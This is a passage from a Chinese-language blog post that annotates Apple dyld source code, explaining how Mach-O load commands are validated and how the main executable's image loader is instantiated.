LinkContext&amp; context,</span><br><span class="line">											<span class="keyword">const</span> linkedit_data_command** codeSigCmd,</span><br><span class="line">											<span class="keyword">const</span> encryption_info_command** encryptCmd)</span><br><span class="line">&#123;</span><br><span class="line">	*compressed = <span class="literal">false</span>;</span><br><span class="line">	*segCount = <span class="number">0</span>;</span><br><span class="line">	*libCount = <span class="number">0</span>;</span><br><span class="line">	*codeSigCmd = <span class="literal">NULL</span>;</span><br><span class="line">	*encryptCmd = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">uint32_t</span> cmd_count = mh-&gt;ncmds;</span><br><span class="line">	<span class="comment">//获取cmds的个数,保存在mach-o文件的头部ncmds字段中</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">struct</span> load_command* <span class="keyword">const</span> startCmds    = (<span class="keyword">struct</span> load_command*)(((<span class="keyword">uint8_t</span>*)mh) + <span class="keyword">sizeof</span>(macho_header));</span><br><span class="line">	<span class="comment">//获取command段开始的地址，startCmds = mach-o地址 + mach-o头部长度</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">struct</span> load_command* <span class="keyword">const</span> endCmds = (<span class="keyword">struct</span> load_command*)(((<span class="keyword">uint8_t</span>*)mh) + <span class="keyword">sizeof</span>(macho_header) + mh-&gt;sizeofcmds);</span><br><span class="line">	<span class="comment">//获取command段结束的地址，endCmds = mach-o地址 + mach-o头部长度 + cmds所用的长度</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">struct</span> load_command* cmd = startCmds;</span><br><span class="line">	<span class="keyword">bool</span> foundLoadCommandSegment = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; cmd_count; ++i) &#123;</span><br><span class="line">		<span class="comment">//遍历每一个command</span></span><br><span class="line">		<span class="keyword">uint32_t</span> cmdLength = cmd-&gt;cmdsize;</span><br><span class="line">		<span class="keyword">struct</span> macho_segment_command* segCmd;</span><br><span class="line">		<span class="keyword">if</span> ( cmdLength &lt; <span class="number">8</span> ) &#123;</span><br><span class="line">			<span class="comment">//格式检测：长度就不对抛出异常</span></span><br><span class="line">			dyld::throwf(<span class="string">"malformed mach-o image: load command #%d length (%u) too small in %s"</span>,</span><br><span class="line">											   i, cmdLength, path);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">const</span> <span class="keyword">struct</span> load_command* <span class="keyword">const</span> nextCmd = (<span class="keyword">const</span> <span class="keyword">struct</span> load_command*)(((<span class="keyword">char</span>*)cmd)+cmdLength);</span><br><span class="line">		<span class="keyword">if</span> ( (nextCmd &gt; endCmds) || (nextCmd &lt; cmd) ) &#123;</span><br><span class="line">			<span class="comment">//格式检测：通过当前command长度寻找nextcmd时，如果nextcmd指不合法的位置就抛出异常</span></span><br><span class="line">			dyld::throwf(<span class="string">"malformed mach-o image: load command #%d length (%u) would exceed sizeofcmds (%u) in %s"</span>,</span><br><span class="line">											   i, cmdLength, mh-&gt;sizeofcmds, path);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">switch</span> (cmd-&gt;cmd) &#123;</span><br><span class="line">			<span class="comment">//针对每种类型的command做不同的操作</span></span><br><span class="line">			<span class="keyword">case</span> LC_DYLD_INFO:</span><br><span class="line">			<span class="keyword">case</span> LC_DYLD_INFO_ONLY:</span><br><span class="line">				*compressed = <span class="literal">true</span>;</span><br><span class="line">				<span class="comment">//mach-o文件为压缩的mach-o文件</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_SEGMENT_COMMAND:</span><br><span class="line">				segCmd = (<span class="keyword">struct</span> macho_segment_command*)cmd;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> __MAC_OS_X_VERSION_MIN_REQUIRED</span></span><br><span class="line">				<span class="comment">// rdar://problem/19617624 allow unmapped segments on OSX (but not iOS)</span></span><br><span class="line">				<span class="comment">// 如果segCmd的文件长度大于segCmd的vmszie，抛出异常。</span></span><br><span class="line">				<span class="comment">// <span class="doctag">todo:</span>结合mach-o文件加载内核部分再详细解释</span></span><br><span class="line">				<span class="keyword">if</span> ( (segCmd-&gt;filesize &gt; segCmd-&gt;vmsize) &amp;&amp; (segCmd-&gt;vmsize != <span class="number">0</span>) )</span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line">				<span class="keyword">if</span> ( segCmd-&gt;filesize &gt; segCmd-&gt;vmsize )</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">				    dyld::throwf(<span class="string">"malformed mach-o image: segment load command %s filesize is larger than vmsize"</span>, segCmd-&gt;segname);</span><br><span class="line">				<span class="comment">// ignore zero-sized segments</span></span><br><span class="line">				<span class="comment">// 忽略长度为0的segments，计算segments的个数</span></span><br><span class="line">				<span class="keyword">if</span> ( segCmd-&gt;vmsize != <span class="number">0</span> )</span><br><span class="line">					*segCount += <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">if</span> ( context.codeSigningEnforced ) &#123;</span><br><span class="line">					<span class="comment">//如果有强制代码签名，则需要更加严格的segments格式合法性检测。</span></span><br><span class="line">					<span class="keyword">uintptr_t</span> vmStart   = segCmd-&gt;vmaddr;</span><br><span class="line">					<span class="keyword">uintptr_t</span> vmSize    = segCmd-&gt;vmsize;</span><br><span class="line">					<span class="keyword">uintptr_t</span> vmEnd     = vmStart + vmSize;</span><br><span class="line">					<span class="keyword">uintptr_t</span> fileStart = segCmd-&gt;fileoff;</span><br><span class="line">					<span class="keyword">uintptr_t</span> fileSize  = segCmd-&gt;filesize;</span><br><span class="line">					</span><br><span class="line">					<span class="comment">//对参数做合法性检测，如果mach-o文件不合法则抛出异常</span></span><br><span class="line">					<span class="keyword">if</span> ( (<span class="keyword">intptr_t</span>)(vmEnd) &lt; <span class="number">0</span>)</span><br><span class="line">						dyld::throwf(<span class="string">"malformed mach-o image: segment load command %s vmsize too large"</span>, segCmd-&gt;segname);</span><br><span class="line">					<span class="keyword">if</span> ( vmStart &gt; vmEnd )</span><br><span class="line">						dyld::throwf(<span class="string">"malformed mach-o image: segment load command %s wraps around address space"</span>, segCmd-&gt;segname);</span><br><span class="line">					<span class="keyword">if</span> ( vmSize != fileSize ) &#123;</span><br><span class="line">						<span class="keyword">if</span> ( (segCmd-&gt;initprot == <span class="number">0</span>) &amp;&amp; (fileSize != <span class="number">0</span>) )</span><br><span class="line">							dyld::throwf(<span class="string">"malformed mach-o image: unaccessable segment %s has filesize != 0"</span>, segCmd-&gt;segname);</span><br><span class="line">						<span class="keyword">else</span> <span class="keyword">if</span> ( vmSize &lt; fileSize )</span><br><span class="line">							dyld::throwf(<span class="string">"malformed mach-o image: segment %s has vmsize &lt; filesize"</span>, segCmd-&gt;segname);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span> ( inCache ) &#123;</span><br><span class="line">						<span class="keyword">if</span> ( (fileSize != <span class="number">0</span>) &amp;&amp; (segCmd-&gt;initprot == (VM_PROT_READ | VM_PROT_EXECUTE)) ) &#123;</span><br><span class="line">							<span class="keyword">if</span> ( foundLoadCommandSegment )</span><br><span class="line">								<span class="keyword">throw</span> <span class="string">"load commands in multiple segments"</span>;</span><br><span class="line">							foundLoadCommandSegment = <span class="literal">true</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span> <span class="keyword">if</span> ( (fileStart &lt; mh-&gt;sizeofcmds) &amp;&amp; (fileSize != <span class="number">0</span>) ) &#123;</span><br><span class="line">						<span class="comment">// &lt;rdar://problem/7942521&gt; all load commands must be in an executable segment</span></span><br><span class="line">						<span class="keyword">if</span> ( (fileStart != <span class="number">0</span>) || (fileSize &lt; (mh-&gt;sizeofcmds+<span class="keyword">sizeof</span>(macho_header))) )</span><br><span class="line">							dyld::throwf(<span class="string">"malformed mach-o image: segment %s does not span all load commands"</span>, segCmd-&gt;segname); </span><br><span class="line">						<span class="keyword">if</span> ( segCmd-&gt;initprot != (VM_PROT_READ | VM_PROT_EXECUTE) ) </span><br><span class="line">							dyld::throwf(<span class="string">"malformed mach-o image: load commands found in segment %s with wrong permissions"</span>, segCmd-&gt;segname); </span><br><span class="line">						<span class="keyword">if</span> ( foundLoadCommandSegment )</span><br><span class="line">							<span class="keyword">throw</span> <span class="string">"load commands in multiple segments"</span>;</span><br><span class="line">						foundLoadCommandSegment = <span class="literal">true</span>;</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">const</span> <span class="keyword">struct</span> macho_section* <span class="keyword">const</span> sectionsStart = (<span class="keyword">struct</span> macho_section*)((<span class="keyword">char</span>*)segCmd + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> macho_segment_command));</span><br><span class="line">					<span class="keyword">const</span> <span class="keyword">struct</span> macho_section* <span class="keyword">const</span> sectionsEnd = &amp;sectionsStart[segCmd-&gt;nsects];</span><br><span class="line">					<span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">struct</span> macho_section* sect=sectionsStart; sect &lt; sectionsEnd; ++sect) &#123;</span><br><span class="line">						<span class="keyword">if</span> (!inCache &amp;&amp; sect-&gt;offset != <span class="number">0</span> &amp;&amp; ((sect-&gt;offset + sect-&gt;size) &gt; (segCmd-&gt;fileoff + segCmd-&gt;filesize)))</span><br><span class="line">							dyld::throwf(<span class="string">"malformed mach-o image: section %s,%s of '%s' exceeds segment %s booundary"</span>, sect-&gt;segname, sect-&gt;sectname, path, segCmd-&gt;segname);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_SEGMENT_COMMAND_WRONG:</span><br><span class="line">				dyld::throwf(<span class="string">"malformed mach-o image: wrong LC_SEGMENT[_64] for architecture"</span>); </span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_LOAD_DYLIB:</span><br><span class="line">			<span class="keyword">case</span> LC_LOAD_WEAK_DYLIB:</span><br><span class="line">			<span class="keyword">case</span> LC_REEXPORT_DYLIB:</span><br><span class="line">			<span class="keyword">case</span> LC_LOAD_UPWARD_DYLIB:</span><br><span class="line">				*libCount += <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_CODE_SIGNATURE:</span><br><span class="line">				*codeSigCmd = (<span class="keyword">struct</span> linkedit_data_command*)cmd; <span class="comment">// only support one LC_CODE_SIGNATURE per image</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_ENCRYPTION_INFO:</span><br><span class="line">			<span class="keyword">case</span> LC_ENCRYPTION_INFO_64:</span><br><span class="line">				*encryptCmd = (<span class="keyword">struct</span> encryption_info_command*)cmd; <span class="comment">// only support one LC_ENCRYPTION_INFO[_64] per image</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		cmd = nextCmd;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( context.codeSigningEnforced &amp;&amp; !foundLoadCommandSegment )</span><br><span class="line">		<span class="keyword">throw</span> <span class="string">"load commands not in a segment"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// &lt;rdar://problem/13145644&gt; verify every segment does not overlap another segment</span></span><br><span class="line">	<span class="keyword">if</span> ( context.codeSigningEnforced ) &#123;</span><br><span class="line">		<span class="comment">//如果设置了强制代码签名，则需要更加严格的检测，确认segments没有互相覆盖。</span></span><br><span class="line">		<span class="keyword">uintptr_t</span> lastFileStart = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">uintptr_t</span> linkeditFileStart = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">const</span> <span class="keyword">struct</span> load_command* cmd1 = startCmds;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; cmd_count; ++i) &#123;</span><br><span class="line">			<span class="keyword">if</span> ( cmd1-&gt;cmd == LC_SEGMENT_COMMAND ) &#123;</span><br><span class="line">				<span class="keyword">struct</span> macho_segment_command* segCmd1 = (<span class="keyword">struct</span> macho_segment_command*)cmd1;</span><br><span class="line">				<span class="keyword">uintptr_t</span> vmStart1   = segCmd1-&gt;vmaddr;</span><br><span class="line">				<span class="keyword">uintptr_t</span> vmEnd1     = segCmd1-&gt;vmaddr + segCmd1-&gt;vmsize;</span><br><span class="line">				<span class="keyword">uintptr_t</span> fileStart1 = segCmd1-&gt;fileoff;</span><br><span class="line">				<span class="keyword">uintptr_t</span> fileEnd1   = segCmd1-&gt;fileoff + segCmd1-&gt;filesize;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (fileStart1 &gt; lastFileStart)</span><br><span class="line">					lastFileStart = fileStart1;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;segCmd1-&gt;segname[<span class="number">0</span>], <span class="string">"__LINKEDIT"</span>) == <span class="number">0</span> ) &#123;</span><br><span class="line">					linkeditFileStart = fileStart1;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">const</span> <span class="keyword">struct</span> load_command* cmd2 = startCmds;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">uint32_t</span> j = <span class="number">0</span>; j &lt; cmd_count; ++j) &#123;</span><br><span class="line">					<span class="keyword">if</span> ( cmd2 == cmd1 )</span><br><span class="line">						<span class="keyword">continue</span>;</span><br><span class="line">					<span class="keyword">if</span> ( cmd2-&gt;cmd == LC_SEGMENT_COMMAND ) &#123;</span><br><span class="line">						<span class="keyword">struct</span> macho_segment_command* segCmd2 = (<span class="keyword">struct</span> macho_segment_command*)cmd2;</span><br><span class="line">						<span class="keyword">uintptr_t</span> vmStart2   = segCmd2-&gt;vmaddr;</span><br><span class="line">						<span class="keyword">uintptr_t</span> vmEnd2     = segCmd2-&gt;vmaddr + segCmd2-&gt;vmsize;</span><br><span class="line">						<span class="keyword">uintptr_t</span> fileStart2 = segCmd2-&gt;fileoff;</span><br><span class="line">						<span class="keyword">uintptr_t</span> fileEnd2   = segCmd2-&gt;fileoff + segCmd2-&gt;filesize;</span><br><span class="line">						<span class="keyword">if</span> ( ((vmStart2 &lt;= vmStart1) &amp;&amp; (vmEnd2 &gt; vmStart1) &amp;&amp; (vmEnd1 &gt; vmStart1)) </span><br><span class="line">						|| ((vmStart2 &gt;= vmStart1) &amp;&amp; (vmStart2 &lt; vmEnd1) &amp;&amp; (vmEnd2 &gt; vmStart2)) )</span><br><span class="line">							dyld::throwf(<span class="string">"malformed mach-o image: segment %s vm overlaps segment %s"</span>, segCmd1-&gt;segname, segCmd2-&gt;segname);</span><br><span class="line">						<span class="keyword">if</span> ( ((fileStart2 &lt;= fileStart1) &amp;&amp; (fileEnd2 &gt; fileStart1) &amp;&amp; (fileEnd1 &gt; fileStart1))</span><br><span class="line">						  || ((fileStart2 &gt;= fileStart1) &amp;&amp; (fileStart2 &lt; fileEnd1) &amp;&amp; (fileEnd2 &gt; fileStart2)) )</span><br><span class="line">							dyld::throwf(<span class="string">"malformed mach-o image: segment %s file content overlaps segment %s"</span>, segCmd1-&gt;segname, segCmd2-&gt;segname); </span><br><span class="line">					&#125;</span><br><span class="line">					cmd2 = (<span class="keyword">const</span> <span class="keyword">struct</span> load_command*)(((<span class="keyword">char</span>*)cmd2)+cmd2-&gt;cmdsize);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			cmd1 = (<span class="keyword">const</span> <span class="keyword">struct</span> load_command*)(((<span class="keyword">char</span>*)cmd1)+cmd1-&gt;cmdsize);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (lastFileStart != linkeditFileStart)</span><br><span class="line">			dyld::throwf(<span class="string">"malformed mach-o image: __LINKEDIT must be last segment"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// fSegmentsArrayCount is only 8-bits</span></span><br><span class="line">	<span class="keyword">if</span> ( *segCount &gt; <span class="number">255</span> )</span><br><span class="line">		dyld::throwf(<span class="string">"malformed mach-o image: more than 255 segments in %s"</span>, path);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// fSegmentsArrayCount is only 8-bits</span></span><br><span class="line">	<span class="keyword">if</span> ( *libCount &gt; <span class="number">4095</span> )</span><br><span class="line">		dyld::throwf(<span class="string">"malformed mach-o image: more than 4095 dependent libraries in %s"</span>, path);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( needsAddedLibSystemDepency(*libCount, mh) )</span><br><span class="line">		*libCount = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1-2-5_instantiateMainExecutable">1.2.5 instantiateMainExecutable</h3><p>classic与compressed的初始化大同小异，先看一下Classic的初始化函数。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create image for main executable</span></span><br><span class="line">ImageLoaderMachOClassic* ImageLoaderMachOClassic::instantiateMainExecutable(<span class="keyword">const</span> macho_header* mh, <span class="keyword">uintptr_t</span> slide, <span class="keyword">const</span> <span class="keyword">char</span>* path, </span><br><span class="line">																		<span class="keyword">unsigned</span> <span class="keyword">int</span> segCount, <span class="keyword">unsigned</span> <span class="keyword">int</span> libCount, <span class="keyword">const</span> LinkContext&amp; context)</span><br><span class="line">&#123;</span><br><span class="line">	ImageLoaderMachOClassic* image = ImageLoaderMachOClassic::instantiateStart(mh, path, segCount, libCount);</span><br><span class="line">	<span class="comment">//实例化image</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//为PIE设置所需的参数，Position Independent Executables</span></span><br><span class="line">	<span class="comment">//<span class="doctag">todo:</span>分析了解PIE</span></span><br><span class="line">	<span class="comment">// set slide for PIE programs</span></span><br><span class="line">	image-&gt;setSlide(slide);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// for PIE record end of program, to know where to start loading dylibs</span></span><br><span class="line">	<span class="keyword">if</span> ( slide != <span class="number">0</span> )</span><br><span class="line">		fgNextPIEDylibAddress = (<span class="keyword">uintptr_t</span>)image-&gt;getEnd();</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置一堆参数</span></span><br><span class="line">	image-&gt;disableCoverageCheck();</span><br><span class="line">	image-&gt;instantiateFinish(context);</span><br><span class="line">	image-&gt;setMapped(context);</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> __i386__</span></span><br><span class="line">	<span class="comment">// kernel may have mapped in __IMPORT segment read-only, we need it read/write to do binding</span></span><br><span class="line">	<span class="keyword">if</span> ( image-&gt;fReadOnlyImportSegment ) &#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">0</span>; i &lt; image-&gt;fSegmentsCount; ++i) &#123;</span><br><span class="line">			<span class="keyword">if</span> ( image-&gt;segIsReadOnlyImport(i) )</span><br><span class="line">				image-&gt;segMakeWritable(i, context);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//如果设置了context.verboseMapping，打印详细的LOG</span></span><br><span class="line">	<span class="keyword">if</span> ( context.verboseMapping ) &#123;</span><br><span class="line">		dyld::<span class="built_in">log</span>(<span class="string">"dyld: Main executable mapped %s\n"</span>, path);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">0</span>, e=image-&gt;segmentCount(); i &lt; e; ++i) &#123;</span><br><span class="line">			<span class="keyword">const</span> <span class="keyword">char</span>* name = image-&gt;segName(i);</span><br><span class="line">			<span class="keyword">if</span> ( (<span class="built_in">strcmp</span>(name, <span class="string">"__PAGEZERO"</span>) == <span class="number">0</span>) || (<span class="built_in">strcmp</span>(name, <span class="string">"__UNIXSTACK"</span>) == <span class="number">0</span>)  )</span><br><span class="line">				dyld::<span class="built_in">log</span>(<span class="string">"%18s at 0x%08lX-&gt;0x%08lX\n"</span>, name, image-&gt;segPreferredLoadAddress(i), image-&gt;segPreferredLoadAddress(i)+image-&gt;segSize(i));</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				dyld::<span class="built_in">log</span>(<span class="string">"%18s at 0x%08lX-&gt;0x%08lX\n"</span>, name, image-&gt;segActualLoadAddress(i), image-&gt;segActualEndAddress(i));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> image;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到加载的核心代码还在<code>ImageLoaderMachOClassic::instantiateStart</code>函数中。</p>
<h3 id="1-2-6_instantiateStart">1.2.6 instantiateStart</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// construct ImageLoaderMachOClassic using "placement new" with SegmentMachO objects array at end</span><br><span class="line">ImageLoaderMachOClassic* ImageLoaderMachOClassic::instantiateStart(const macho_header* mh, const char* path,</span><br><span class="line">																		unsigned int segCount, unsigned int libCount)</span><br><span class="line">&#123;</span><br><span class="line">	size_t size = sizeof(ImageLoaderMachOClassic) + segCount * sizeof(uint32_t) + libCount * sizeof(ImageLoader*);</span><br><span class="line">	ImageLoaderMachOClassic* allocatedSpace = static_cast&lt;ImageLoaderMachOClassic*&gt;(malloc(size));</span><br><span class="line">	if ( allocatedSpace == NULL )</span><br><span class="line">		throw "malloc failed";</span><br><span class="line">	uint32_t* segOffsets = ((uint32_t*)(((uint8_t*)allocatedSpace) + sizeof(ImageLoaderMachOClassic)));</span><br><span class="line">	bzero(&amp;segOffsets[segCount], libCount*sizeof(void*));	// zero out lib array</span><br><span class="line">	return new (allocatedSpace) ImageLoaderMachOClassic(mh, path, segCount, segOffsets, libCount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里仍然没有出现加载核心代码，只是根据之前获得的数据申请了内存，并计算了segments的指针。而</p>
<p><code>ImageLoaderMachOClassic</code>的构造才是加载逻辑。</p>
<h3 id="1-2-7_ImageLoaderMachO">1.2.7 ImageLoaderMachO</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">ImageLoaderMachOClassic::ImageLoaderMachOClassic(<span class="keyword">const</span> macho_header* mh, <span class="keyword">const</span> <span class="keyword">char</span>* path, </span><br><span class="line">													<span class="keyword">unsigned</span> <span class="keyword">int</span> segCount, <span class="keyword">uint32_t</span> segOffsets[], <span class="keyword">unsigned</span> <span class="keyword">int</span> libCount)</span><br><span class="line"> : ImageLoaderMachO(mh, path, segCount, segOffsets, libCount), fStrings(<span class="literal">NULL</span>), fSymbolTable(<span class="literal">NULL</span>), fDynamicInfo(<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ImageLoaderMachO::ImageLoaderMachO(<span class="keyword">const</span> macho_header* mh, <span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">unsigned</span> <span class="keyword">int</span> segCount, </span><br><span class="line">																<span class="keyword">uint32_t</span> segOffsets[], <span class="keyword">unsigned</span> <span class="keyword">int</span> libCount)</span><br><span class="line"> : ImageLoader(path, libCount), fCoveredCodeLength(<span class="number">0</span>), fMachOData((<span class="keyword">uint8_t</span>*)mh), fLinkEditBase(<span class="literal">NULL</span>), fSlide(<span class="number">0</span>),</span><br><span class="line">	fEHFrameSectionOffset(<span class="number">0</span>), fUnwindInfoSectionOffset(<span class="number">0</span>), fDylibIDOffset(<span class="number">0</span>), </span><br><span class="line">fSegmentsCount(segCount), fIsSplitSeg(<span class="literal">false</span>), fInSharedCache(<span class="literal">false</span>),</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> TEXT_RELOC_SUPPORT</span></span><br><span class="line">	fTextSegmentRebases(<span class="literal">false</span>),</span><br><span class="line">	fTextSegmentBinds(<span class="literal">false</span>),</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> __i386__</span></span><br><span class="line">	fReadOnlyImportSegment(<span class="literal">false</span>),</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	fHasSubLibraries(<span class="literal">false</span>), fHasSubUmbrella(<span class="literal">false</span>), fInUmbrella(<span class="literal">false</span>), fHasDOFSections(<span class="literal">false</span>), fHasDashInit(<span class="literal">false</span>),</span><br><span class="line">	fHasInitializers(<span class="literal">false</span>), fHasTerminators(<span class="literal">false</span>), fRegisteredAsRequiresCoalescing(<span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">	fIsSplitSeg = ((mh-&gt;flags &amp; MH_SPLIT_SEGS) != <span class="number">0</span>);        </span><br><span class="line"></span><br><span class="line">	<span class="comment">// construct SegmentMachO object for each LC_SEGMENT cmd using "placement new" to put </span></span><br><span class="line">	<span class="comment">// each SegmentMachO object in array at end of ImageLoaderMachO object</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">uint32_t</span> cmd_count = mh-&gt;ncmds;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">struct</span> load_command* <span class="keyword">const</span> cmds = (<span class="keyword">struct</span> load_command*)&amp;fMachOData[<span class="keyword">sizeof</span>(macho_header)];</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">struct</span> load_command* cmd = cmds;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>, segIndex=<span class="number">0</span>; i &lt; cmd_count; ++i) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( cmd-&gt;cmd == LC_SEGMENT_COMMAND ) &#123;</span><br><span class="line">			<span class="keyword">const</span> <span class="keyword">struct</span> macho_segment_command* segCmd = (<span class="keyword">struct</span> macho_segment_command*)cmd;</span><br><span class="line">			<span class="comment">// ignore zero-sized segments</span></span><br><span class="line">			<span class="keyword">if</span> ( segCmd-&gt;vmsize != <span class="number">0</span> ) &#123;</span><br><span class="line">				<span class="comment">// record offset of load command</span></span><br><span class="line">				segOffsets[segIndex++] = (<span class="keyword">uint32_t</span>)((<span class="keyword">uint8_t</span>*)segCmd - fMachOData);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		cmd = (<span class="keyword">const</span> <span class="keyword">struct</span> load_command*)(((<span class="keyword">char</span>*)cmd)+cmd-&gt;cmdsize);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里也没有什么复杂的代码了，就是根据<code>mach-o</code>文件<code>segments</code>的规则将数据加载到内存中。</p>
<p>这边返回之后就剩下调用<code>addimage</code>函数了。</p>
